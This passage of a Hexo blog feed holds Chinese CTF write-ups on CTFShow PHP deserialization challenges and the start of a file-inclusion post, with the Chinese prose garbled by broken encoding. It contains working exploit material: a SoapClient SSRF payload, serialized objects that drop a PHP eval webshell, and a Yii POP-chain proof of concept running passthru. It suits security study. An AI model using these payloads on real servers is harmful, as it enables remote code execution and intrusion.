href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShowååºåˆ—åŒ–</title>
      <link href="/posts/17329.html"/>
      <url>/posts/17329.html</url>
      
        <content type="html"><![CDATA[<h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><p>åºåˆ—åŒ–çš„æ¦‚å¿µï¼šæŠŠä¸€ä¸ªå¯¹è±¡è½¬ä¸ºå­—ç¬¦ä¸²</p><p>åºåˆ—åŒ–çš„å¥½å¤„ï¼š</p><p>1ã€æœ‰åˆ©äºæ•°æ®å­˜å‚¨</p><p>2ã€æ–¹ä¾¿æ•°æ®ä¼ é€’</p><p>åºåˆ—åŒ–åå­—ç¬¦ä¸²çš„æ ¼å¼</p><pre class="line-numbers language-none"><code class="language-none">Publicå±æ€§åºåˆ—åŒ–åæ ¼å¼ï¼šæˆå‘˜åPrivateå±æ€§åºåˆ—åŒ–åæ ¼å¼ï¼š%00ç±»å%00æˆå‘˜åProtectå±æ€§åºåˆ—åŒ–åæ ¼å¼ï¼š%00*%00æˆå‘˜å<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>O:å¯¹è±¡ç±»åé•¿åº¦:â€å¯¹è±¡ç±»åâ€:å¯¹è±¡å±æ€§ä¸ªæ•°{å±æ€§åç±»å‹:å±æ€§åé•¿åº¦:â€å±æ€§åå­—â€;å±æ€§ç±»å‹:å±æ€§é•¿åº¦:â€å±æ€§å†…å®¹â€}</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PHP</span>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ–¹æ³•ï¼š<span class="token number">1</span>ã€__construct å½“ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºæ—¶è°ƒç”¨<span class="token number">2</span>ã€__destruct å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶è°ƒç”¨<span class="token number">3</span>ã€__toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²æ—¶ä½¿ç”¨<span class="token number">4</span>ã€__sleep åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ<span class="token number">5</span>ã€__wakeup åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åè°ƒç”¨__construct<span class="token comment">// è§¦å‘æ¡ä»¶ï¼Œæ„é€ å‡½æ•°ï¼Œå½“æ„é€ ä¸€ä¸ªå¯¹è±¡æ—¶è°ƒç”¨ã€‚</span><span class="token comment">// å¯¹è±¡åˆ›å»ºæ—¶é”€æ¯</span>__destruct<span class="token comment">// è§¦å‘æ¡ä»¶ï¼Œææ„å‡½æ•°ï¼Œå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨ã€‚</span><span class="token comment">// åºåˆ—åŒ–æ—¶ä¼šé”€æ¯ä¸€æ¬¡ï¼Œå¯¹è±¡é”€æ¯æ—¶æ‰§è¡Œï¼Œåºåˆ—åŒ–è¾“å‡ºå‰è¿è¡Œï¼Œä½†ä¸å½±å“åºåˆ—åŒ–å†…å®¹</span>__unserialize<span class="token comment">// è§¦å‘æ¡ä»¶ï¼Œ7.4ç‰ˆæœ¬ä»¥ä¸Šï¼Œååºåˆ—åŒ–æ—¶å‡ºå‘ï¼Œä¸”å¯ä»¥ç»•è¿‡__wakeup</span>__sleep<span class="token comment">// åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span>__wakeup<span class="token comment">// åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åè¢«è°ƒç”¨</span>__invoke<span class="token comment">// å½“å¯¹è±¡è¢«è°ƒç”¨æ—¶æ‰§è¡Œ</span><span class="token comment">// å‡½æ•°å½¢å¼è°ƒç”¨å¯¹è±¡æ—¶ï¼Œè§¦å‘çš„æ–¹æ³•</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>254</strong></p><pre class="line-numbers language-none"><code class="language-none">payload:?username&#x3D;xxxxx&amp;password&#x3D;xxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŒ‰ç…§é¢˜ä¸­å…¨ç­‰äºç›´æ¥æ„é€ å³å¯</p><p><strong>255-257</strong></p><p>æ„é€ å°±è¡Œ</p><p><strong>258</strong></p><p>è¿‡æ»¤äº†<code>O:æ•°å­—</code>çš„å½¢å¼ï¼Œåœ¨å†’å·ååŠ +å³å¯ï¼ŒURLdecodeä¼šè‡ªåŠ¨è§£ææˆè¿æ¥çš„</p><p><strong>259</strong></p><p>ä»€ä¹ˆç©æ„è·³è¿‡äº†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//flag.php$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);array_pop($xff);$ip = array_pop($xff);if($ip!=='127.0.0.1')&#123;die('error');&#125;else&#123;$token = $_POST['token'];if($token=='ctfshow')&#123;file_put_contents('flag.txt',$flag);&#125;&#125;//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vip can get flag one key</span><span class="token variable">$vip</span><span class="token operator">-></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç°æºœæºœçš„å›æ¥çœ‹WP</p><pre class="line-numbers language-none"><code class="language-none">å¦‚æœè°ƒç”¨ä¸€ä¸ªæ²¡æœ‰å®šä¹‰çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šä½¿ç”¨ç±»æœ¬èº«çš„callæ–¹æ³•ã€‚ç”±äºç»™äº†ä¸ªssrfçš„ä»£ç ï¼Œé‚£ä¹ˆæ²³é‡Œæ¨æ–­è¿™æ˜¯ä¸€ä¸ªssrfçš„åŸç”Ÿç±»ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;PHPä¸­åŸç”Ÿç±»class SoapClient &#123;    &#x2F;* Methods *&#x2F;    public __construct(?string $wsdl, array $options &#x3D; [])    public __call(string $name, array $args): mixed    public __doRequest(        string $request,        string $location,        string $action,        int $version,        bool $oneWay &#x3D; false    ): ?string    public __getCookies(): array    public __getFunctions(): ?array    public __getLastRequest(): ?string    public __getLastRequestHeaders(): ?string    public __getLastResponse(): ?string    public __getLastResponseHeaders(): ?string    public __getTypes(): ?array    public __setCookie(string $name, ?string $value &#x3D; null): void    public __setLocation(?string $location &#x3D; null): ?string    public __setSoapHeaders(SoapHeader|array|null $headers &#x3D; null): bool    public __soapCall(        string $name,        array $args,        ?array $options &#x3D; null,        SoapHeader|array|null $inputHeaders &#x3D; null,        array &amp;$outputHeaders &#x3D; null    ): mixed&#125;&#x2F;&#x2F;å¯ä»¥å¾—çŸ¥æ„é€ SoapClientçš„ç±»å¯¹è±¡çš„æ—¶å€™ï¼Œéœ€è¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå­—ç¬¦ä¸²$wsdlå’Œæ•°ç»„$options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">åœ¨æ„é€ SoapClientç±»æ—¶ï¼Œä¼ å…¥æ•°ç»„å‚æ•°ä¸ºï¼šarray('uri'=>'http://é“¾æ¥','location'=>'http://é“¾æ¥/æ–‡ä»¶','user_agent'=>'UAå¤´')è¯¥ç±»çš„__callæ–¹æ³•å¯æ„é€ è¯·æ±‚ä½¿å…¶å¯¹æŒ‡å®šURLå‘èµ·POSTè¯·æ±‚æ‰€ä»¥æ„é€ è¯¥ç±»ä»£ç å¦‚ä¸‹<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token variable">$ua</span><span class="token operator">=</span><span class="token string double-quoted-string">"ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow"</span><span class="token punctuation">;</span>   <span class="token comment">/*ç›¸å½“äºæ„é€ å‡ºä»¥ä¸‹è¯·æ±‚   User-Agent: ctfshow   x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1   Content-Type:application/x-www-form-urlencoded   Content-Length:13      token=ctfshow   */</span>   <span class="token comment">//ç”±äºContent-Lengthå·²ç»ç¡®å®šï¼Œæ‰€ä»¥åé¢è¯¥ç±»è‡ªè¡Œæ„é€ çš„è¯·æ±‚å¤´å¤±æ•ˆ</span>   <span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'location'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token variable">$ua</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>260</strong></p><p>å°±è¾“å…¥é‚£ä¸²å­—ç¬¦å°±è¡Œ</p><p><strong>261</strong></p><p>çŸ¥è¯†ç‚¹ï¼šåœ¨7.4ä»¥ä¸Šç‰ˆæœ¬ååºåˆ—åŒ–ä¼šç»•è¿‡__wakeup()å‡½æ•°</p><p>$this-&gt;code==0x36dæ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œ0x36dåˆæœ‰æ²¡æœ‰æ‰“å¼•å·ï¼Œæ‰€ä»¥ä»£è¡¨æ•°å­—877ï¼Œæ„é€ æ—¶ä½¿ç”¨877å¼€å¤´çš„æ–‡ä»¶å³å¯ï¼Œæœ€ç»ˆæ„é€ å†…å®¹å¦‚ä¸‹</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php   class ctfshowvip&#123;      public $username&#x3D;&quot;877.php&quot;;      public $password&#x3D;&quot;&lt;?php eval(\$_POST[&#39;kkk&#39;]);?&gt;&quot;;  &#x2F;&#x2F;è¿™é‡Œè®°å¾—è½¬è¯‘ï¼Œä¸ç„¶ä¼šè®©ä½ ä¼ å…¥kkkå‚æ•°çš„      public $code;   &#125;   $s&#x3D;new ctfshowvip();   echo serialize($s);?&gt;&#x2F;&#x2F;æ— è¯­Windows DefenceæŠŠæˆ‘æ–‡ä»¶åˆ äº†ğŸ˜…<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>262</strong></p><p>ç®€å•è½»æ¾è§£æ³•ï¼š</p><p>åœ¨message.phpä¸­ç›´æ¥æ„é€ token=adminçš„ç±»</p><p>å›°éš¾å­¦ä¹ è§£æ³•ï¼š</p><p><strong>263</strong></p><p>èœç‹—ç›´æ¥wp</p><p>é¦–å…ˆçœ‹</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;index.php$_SESSION[&#39;limti&#39;]&gt;5?die(&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;):$_SESSION[&#39;limit&#39;]&#x3D;base64_decode($_COOKIE[&#39;limit&#39;]);&#x2F;&#x2F;æ˜æ˜¾limtiå†™é”™äº†ï¼Œæ‰€ä»¥è¿™ä¸ªä»£ç æ°¸è¿œæ‰§è¡Œçš„æ˜¯$_SESSION[&#39;limit&#39;]&#x3D;base64_decode($_COOKIE[&#39;limit&#39;]);&#x2F;&#x2F;æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶sessionä¸­çš„å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>çŸ¥è¯†ç‚¹ï¼šsessionåœ¨å­˜å‚¨æ—¶æœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ç§æ˜¯phpï¼Œä¸€ç§æ˜¯php_serialize</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpclass user&#123;      public $name&#x3D;&quot;jlan&quot;;      public $pass&#x3D;&quot;123456&quot;;  &#125;$s&#x3D;new user();&#x2F;&#x2F;phpå­˜å‚¨ï¼šuser|O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;jlan&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&#x2F;&#x2F;php_serializeå­˜å‚¨ï¼ša:1:&#123;s:4:&quot;user&quot;;O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;jlan&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°è¯¡å¼‚çš„ç‚¹äº†å—ï¼Œåœ¨phpå­˜å‚¨ä¸­ï¼Œï½œæ˜¯ç”¨æ¥åˆ†ç¦»å˜é‡åå’Œåºåˆ—åŒ–åçš„å†…å®¹çš„ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬æ„é€ å‡ºåºåˆ—åŒ–å¥½çš„å†…å®¹å¹¶ä¸”åœ¨å‰é¢åŠ ï½œå°±å¯ä»¥è®©ç¨‹åºè¿›è¡Œè‡ªåŠ¨ååºåˆ—åŒ–</p><p>ç»§ç»­æŸ¥çœ‹inc/inc.php</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F;inc&#x2F;inc.phpclass User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username &#x3D; $username;        $this-&gt;password &#x3D; $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status&#x3D;$s;    &#125;    function __destruct()&#123;        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;ä½¿ç”¨&quot;.$this-&gt;password.&quot;ç™»é™†&quot;.($this-&gt;status?&quot;æˆåŠŸ&quot;:&quot;å¤±è´¥&quot;).&quot;----&quot;.date_create()-&gt;format(&#39;Y-m-d H:i:s&#39;));    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­åŒ…å«<code>file_put_contents</code>å‡½æ•°å¯è¿›è¡Œä¸€å¥è¯æœ¨é©¬çš„å†™å…¥</p><p>æœ€ç»ˆæ„é€ å¦‚ä¸‹</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class User&#123;    public $username&#x3D;&quot;1.php&quot;;    public $password&#x3D;&quot;&lt;?php eval(\$_POST[&#39;kkk&#39;]);phpinfo();?&gt;&quot;;    public $status&#x3D;&#39;1&#39;;&#125;$s&#x3D;new User();echo base64_encode(&#39;|&#39;.serialize($s));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆä¿®æ”¹cookieè®¿é—®ä¸»é¡µï¼Œç„¶åè®¿é—®/check.phpä½¿å¾—æœ¨é©¬æ–‡ä»¶è¢«å†™å…¥ï¼Œæœ€åè®¿é—®/log-1.phpå³å¯</p><p>264</p><p><strong>265</strong></p><p>åœ°å€ä¼ å‚</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpclass ctfshowAdmin&#123;   public $token;   public $password;   public function __construct()&#123;       $this-&gt;token&#x3D;&#39;a&#39;;       $this-&gt;password &#x3D; &amp;$this-&gt;token;&#125;&#125;$a&#x3D;new ctfshowAdmin();echo serialize($a);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>266</strong></p><p>åŒ¹é…æŠ›å‡ºå¼‚å¸¸å__destrurtä¸è§¦å‘ï¼Œæ‰€ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡å³å¯</p><p><strong>267</strong></p><p>yiiæ¡†æ¶çš„ååºåˆ—åŒ–æ¼æ´ï¼Œåˆ©ç”¨çš„ç±»</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">yii\db\BatchQueryResult    public function __destruct()    &#123;        &#x2F;&#x2F; make sure cursor is closed        $this-&gt;reset();    &#125;    public function reset()    &#123;        if ($this-&gt;_dataReader !&#x3D;&#x3D; null) &#123;            $this-&gt;_dataReader-&gt;close();        &#125;        $this-&gt;_dataReader &#x3D; null;        $this-&gt;_batch &#x3D; null;        $this-&gt;_value &#x3D; null;        $this-&gt;_key &#x3D; null;    &#125;è¿™é‡Œçš„$this-&gt;_dataReaderå†…å®¹å¯æ§ï¼Œå¯ä»¥è°ƒç”¨ä¸å­˜åœ¨closeæ–¹æ³•å¹¶ä¸”å­˜åœ¨__callæ–¹æ³•çš„ç±»ï¼Œå…¨å±€æœç´¢__callæ–¹æ³•åï¼Œå‘ç°åœ¨yii\vendor\fzaninotto\faker\src\Faker\Generator.php    public function __call($method, $attributes)    &#123;        return $this-&gt;format($method, $attributes);    &#125;è·Ÿè¿›format    public function format($formatter, $arguments &#x3D; array())    &#123;        return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);    &#125;è·Ÿè¿›getFormatter    public function getFormatter($formatter)    &#123;        if (isset($this-&gt;formatters[$formatter])) &#123;            return $this-&gt;formatters[$formatter];        &#125;        foreach ($this-&gt;providers as $provider) &#123;            if (method_exists($provider, $formatter)) &#123;                $this-&gt;formatters[$formatter] &#x3D; array($provider, $formatter);                return $this-&gt;formatters[$formatter];&#x2F;&#x2F;è¿™é‡Œä¼šè¿”å›ä¼ å…¥çš„$formatterçš„å€¼            &#125;        &#125;        throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));    &#125;å‘ç°formatæ–¹æ³•ä¸­çš„call_user_func_arrayçš„ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œæƒ³è¦åˆ©ç”¨è¿›è€ŒæŸ¥æ‰¾è°ƒç”¨äº†call_user_funcå‡½æ•°çš„æ— å‚æ–¹æ³•ã€‚å‘ç°äº†IndexAction.phpä¸­çš„runæ–¹æ³•yii\rest\IndexAction.php    public function run()    &#123;        if ($this-&gt;checkAccess) &#123;            call_user_func($this-&gt;checkAccess, $this-&gt;id);        &#125;        return $this-&gt;prepareDataProvider();    &#125;åœ¨runæ–¹æ³•ä¸­checkAccesså’Œidéƒ½å¯æ§ï¼Œåˆ©ç”¨é“¾æ„é€ æˆåŠŸ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨é“¾</p><p><code>yii\db\BatchQueryResult::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">poc<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowæ–‡ä»¶åŒ…å«</title>
      <link href="/posts/5550.html"/>
      <url>/posts/5550.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><p>å¸¸è§çš„æ–‡ä»¶åŒ…å«æ¼æ´å‡½æ•°ï¼šinclude()ï¼Œrequire()</p><h3 id="æœ¬åœ°åŒ…å«"><a href="#æœ¬åœ°åŒ…å«" class="headerlink" title="æœ¬åœ°åŒ…å«"></a>æœ¬åœ°åŒ…å«</h3><h4 id="åˆ©ç”¨æ–¹å¼ï¼š"><a href="#åˆ©ç”¨æ–¹å¼ï¼š" class="headerlink" title="åˆ©ç”¨æ–¹å¼ï¼š"></a>åˆ©ç”¨æ–¹å¼ï¼š</h4><h6 id="1ã€php-inputï¼š"><a href="#1ã€php-inputï¼š" class="headerlink" title="1ã€php://inputï¼š"></a>1ã€php://inputï¼š</h6><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;inputè¯·æ±‚ä½“å†…ä¸ºPHPä»£ç ï¼š&lt;?php phpinfo(); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>php://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://inputï¼ŒåŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>é‡åˆ°file_get_contents()è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ã€‚</p><span id="more"></span><h6 id="2ã€php-filterï¼š"><a href="#2ã€php-filterï¼š" class="headerlink" title="2ã€php://filterï¼š"></a>2ã€php://filterï¼š</h6><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;rescource&#x3D;xxx.phpä»¥base64ç¼–ç è¯»å–?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>php://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><h6 id="3ã€zip-ï¼š"><a href="#3ã€zip-ï¼š" class="headerlink" title="3ã€zip://ï¼š"></a>3ã€zip://ï¼š</h6><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;zip:&#x2F;&#x2F;[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>zip:// å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç 